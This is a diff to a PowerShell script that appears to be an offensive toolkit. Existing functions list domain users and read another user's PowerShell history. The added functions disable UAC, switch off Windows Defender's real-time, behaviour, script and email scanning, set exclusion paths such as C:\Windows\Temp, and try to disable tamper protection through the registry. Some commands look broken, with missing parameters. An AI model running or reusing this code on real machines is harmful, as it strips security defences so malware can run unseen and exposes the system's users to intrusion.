@@ -104,7 +104,6 @@ function Get-AllUsers{
     #Print
     Write-Host "Domain Users" -ForegroundColor Black -Backgroundcolor Magenta
     Write-Host $Users 
-
 }   
 
 <# 
@@ -123,4 +122,84 @@ function Get-History{
     Write-Host "Account name for user you want powershell history for: " -ForegroundColor Black -Backgroundcolor Green -NoNewLine
     $Username = Read-Host
     Get-Content -Path C:\Users\$Username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+}
+
+function Close-Defender{
+
+    $DefenderEnabled = $true
+
+    while($DefenderEnabled -eq $true){
+        # Check if defender is enabled
+        $Defenderon = (Get-MpComputerStatus).AntivirusEnabled
+        if($Defenderon -eq $true){
+            Write-Host "Windows defender is active, attempting to disable defender!" -ForegroundColor Black -Backgroundcolor Green
+        }
+        else{
+            Write-Host "Windows defender is inactive, no further action required!" -ForegroundColor Black -Backgroundcolor Red
+            break
+        }
+
+        # Disable UAC
+        Write-Host "Disabling UAC..." -ForegroundColor Black -Backgroundcolor Red 
+        cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+
+        # Check if tamper protection is enabled
+        $Defendertamper = (Get-MpComputerStatus).IsTamperProtected
+        if($Defendertamper -eq $true){
+            Write-Host "Tamper protection is enabled, unable to disable defender." -ForegroundColor Black -Backgroundcolor Red
+            break
+        }
+        else{
+            Write-Host "Tamper protection disabled, attempting to disable defender!" -ForegroundColor Black -Backgroundcolor Green
+        }
+
+        # Disable defender
+        $params = @{
+            DisableRealtimeMonitoring = $true
+            DisableIOAVProtection = $true
+            DisableBehaviourMonitoring = $true
+            DisableBlockAtFirstSeen = $true
+            DisableEmailScanning = $true
+            DisableScriptScanning = $true
+            ExclusionPath = "ps1"
+        }
+        Set-MpPreference @params
+
+        # Add a folder exclusion
+        $Path = "C:\Windows\Temp"
+        Add-MpPreference -ExclusionPath 
+
+        # Print completed
+        Write-Host "Windows defender disabled. Exclusion path set to $Path!" -ForegroundColor Black -Backgroundcolor Green
+        break
+    }
+} 
+
+function Add-DefenderExclusion{
+
+    param(
+        [Parameter(Mandatory = $true)] [string[]]$Path
+    )
+    # Add exclusion to specified path
+    Add-MpPreference $Path
+
+    # Print 
+    Write-Host "Defender exclusion path added @ $Path." -ForegroundColor Black -Backgroundcolor Green
+}
+
+function Close-TamperProtection{
+    $RegistryPath = "HKLM:SOFTWARE\Microsoft\Windows Defender\Features"
+    $Name = "TamperProtection"
+    $Value = 0
+
+    New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType DWORD -Force -ea SilentlyContinue
+
+    $TamperProperty = (Get-ItemProperty -Path $RegistryPath -Name $Name).TamperProtection
+
+    if($TamperProperty -eq 0){
+        Write-Host "Tamper protection disabled!" -ForegroundColor Black -Backgroundcolor Green
+    }
+    else{
+        Write-Host "Unable to disable tamper protection!" -ForegroundColor Black -Backgroundcolor Red
+    }
 }
